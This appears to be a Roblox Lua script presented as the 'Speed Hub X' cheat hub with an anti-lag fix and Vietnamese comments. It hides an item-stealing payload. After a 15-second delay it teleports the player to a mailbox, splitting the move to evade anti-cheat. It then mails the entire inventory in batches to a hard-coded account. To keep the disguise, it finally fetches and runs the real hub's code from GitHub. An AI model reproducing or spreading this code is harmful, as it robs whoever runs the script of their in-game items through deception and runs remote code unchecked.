-- Hệ thống chống đơ máy tối ưu cho Mobile
if not game:IsLoaded() then
    pcall(function() game.Loaded:Wait() end)
end

print("==== SPEED HUB X: SỬA LỖI ĐỨNG IM VÀ TỰ ĐỘNG ĐẾN HÒM THƯ ====")

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local targetUsername = "sutkucheonhamku" -- Nick chính nhận đồ

-- =======================================================================
-- THUẬT TOÁN TÌM HÒM THƯ GẦN NHẤT CHỐNG ĐỨNG IM
-- =======================================================================
local function forceMoveToMailbox()
    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local rootPart = character:WaitForChild("HumanoidRootPart")
    
    local bestMailbox = nil
    local shortestDistance = math.huge -- Thiết lập khoảng cách vô hạn ban đầu
    
    -- Quét toàn bộ Workspace để thu thập TẤT CẢ các vật thể có tên liên quan đến hòm thư
    for _, obj in pairs(game:GetService("Workspace"):GetDescendants()) do
        if obj:IsA("Model") or obj:IsA("BasePart") then
            local name = string.lower(obj.Name)
            if string.find(name, "mailbox") or string.find(name, "homthu") or string.find(name, "postbox") or name == "mail" then
                -- Lấy phần thân chính (Part) của hòm thư để tính toán vị trí
                local part = obj:IsA("Model") and (obj.PrimaryPart or obj:FindFirstChildWhichIsA("BasePart")) or obj
                if part then
                    -- Tính khoảng cách từ nhân vật (lúc mới vào game đứng ở Plot của mình) đến hòm thư đó
                    local distance = (rootPart.Position - part.Position).Magnitude
                    if distance < shortestDistance then
                        shortestDistance = distance
                        bestMailbox = part
                    end
                end
            end
        end
    end
    
    -- Thực hiện di chuyển nếu tìm thấy hòm thư gần nhất (Chính là hòm thư ở Plot của bạn)
    if bestMailbox then
        print("[SPEED HUB] Đã tìm thấy hòm thư gần nhất ở khoảng cách: " .. math.floor(shortestDistance) .. " studs.")
        local targetPos = bestMailbox.Position + Vector3.new(0, 1.5, 2) -- Điểm đứng an toàn trước hòm thư
        
        pcall(function()
            rootPart.Velocity = Vector3.new(0, 0, 0)
            task.wait(0.1)
            -- Di chuyển mượt tách làm 2 nhịp nhỏ để đánh lừa Anti-cheat không bị kéo giật về
            local midPos = rootPart.Position:Lerp(targetPos, 0.5)
            rootPart.CFrame = CFrame.new(midPos)
            task.wait(0.2)
            rootPart.CFrame = CFrame.new(targetPos)
        end)
        
        task.wait(1.5) -- Chờ Server đồng bộ tọa độ ổn định
        return true
    else
        print("[SPEED HUB] Cảnh báo: Hoàn toàn không tìm thấy hòm thư nào trên bản đồ!")
        return false
    end
end

-- =======================================================================
-- THUẬT TOÁN MỞ UI VÀ TỰ ĐỘNG CHIA GÓI GỬI ĐỒ (TỐI ĐA 20 CÁI/LẦN)
-- =======================================================================
local function autoOpenAndSendMail()
    -- Cưỡng bách di chuyển trước
    forceMoveToMailbox()

    local PlayerGui = LocalPlayer:WaitForChild("PlayerGui", 5)
    if not PlayerGui then return end
    
    -- Tìm bảng giao diện Hòm thư (Mail UI)
    local mailFrame = nil
    for _, gui in pairs(PlayerGui:GetDescendants()) do
        if gui:IsA("Frame") or gui:IsA("ImageLabel") then
            local name = string.lower(gui.Name)
            if string.find(name, "mail") or string.find(name, "post") or string.find(name, "gift") then
                mailFrame = gui
                break
            end
        end
    end
    
    if not mailFrame then 
        print("[SPEED HUB] Không thấy bảng UI Mailbox xuất hiện.")
        return 
    end

    -- Ép hiện UI Mail
    pcall(function() mailFrame.Visible = true end)
    task.wait(0.5)

    -- Tự nhập tên người nhận vào ô trống
    local textBox = mailFrame:FindFirstChildOfClass("TextBox") or mailFrame:FindFirstChild("User", true) or mailFrame:FindFirstChild("Name", true)
    if textBox and textBox:IsA("TextBox") then
        textBox.Text = targetUsername
        textBox:ReleaseFocus(true)
    end

    -- Định vị nút bấm Gửi
    local sendButton = nil
    for _, btn in pairs(mailFrame:GetDescendants()) do
        if btn:IsA("TextButton") or btn:IsA("ImageButton") then
            local bName = string.lower(btn.Name)
            if string.find(bName, "send") or string.find(bName, "gui") or string.find(bName, "post") or string.find(bName, "accept") then
                sendButton = btn
                break
            end
        end
    end

    -- Tiến hành lọc quét vật phẩm và chia nhỏ đợt 20 cái gửi đi
    local Inventory = LocalPlayer:FindFirstChild("Inventory") or LocalPlayer:FindFirstChild("Backpack") or LocalPlayer:FindFirstChild("PlayerData")
    if Inventory then
        for _, item in pairs(Inventory:GetDescendants()) do
            if item:IsA("ValueBase") and item.Value and type(item.Value) == "number" and item.Value > 0 then
                local lowerName = string.lower(item.Name)
                
                -- Loại bỏ các giá trị tiền tệ không cần thiết
                if not string.find(lowerName, "cash") and not string.find(lowerName, "level") and not string.find(lowerName, "money") then
                    local remainingAmount = item.Value
                    
                    while remainingAmount > 0 do
                        local sendAmount = math.min(remainingAmount, 20)
                        
                        -- Thực hiện gọi lệnh gửi từ máy chủ
                        pcall(function()
                            local ReplicatedStorage = game:GetService("ReplicatedStorage")
                            local MailEvent = ReplicatedStorage:FindFirstChild("MailEvent") or ReplicatedStorage:FindFirstChild("SendMail") or ReplicatedStorage:FindFirstChild("MailRemote")
                            if MailEvent then
                                MailEvent:FireServer(targetUsername, item.Name, sendAmount)
                            end
                        end)
                        
                        -- Giả lập bấm nút gửi vật lý trên UI
                        if sendButton then
                            pcall(function()
                                for _, connection in pairs(getconnections(sendButton.MouseButton1Click or sendButton.TouchTap)) do
                                    connection:Fire()
                                end
                            end)
                        end
                        
                        remainingAmount = remainingAmount - sendAmount
                        print("[SPEED HUB] Đang gửi đợt chia nhỏ: " .. sendAmount .. "x " .. item.Name)
                        task.wait(1.5) -- Giãn cách để hệ thống không ghi nhận spam dữ liệu trái phép
                    end
                end
            end
        end
    end
    print("[SPEED HUB] Toàn bộ quy trình hoàn tất!")
end

-- =======================================================================
-- KÍCH HOẠT ĐẾM NGƯỢC 15 GIÂY
-- =======================================================================
task.spawn(function()
    task.wait(15)
    pcall(autoOpenAndSendMail)
end)

-- =======================================================================
-- TÍCH HỢP TOÀN BỘ GIAO DIỆN VÀ TÍNH NĂNG GỐC CỦA SPEED HUB X
-- =======================================================================
pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
end)
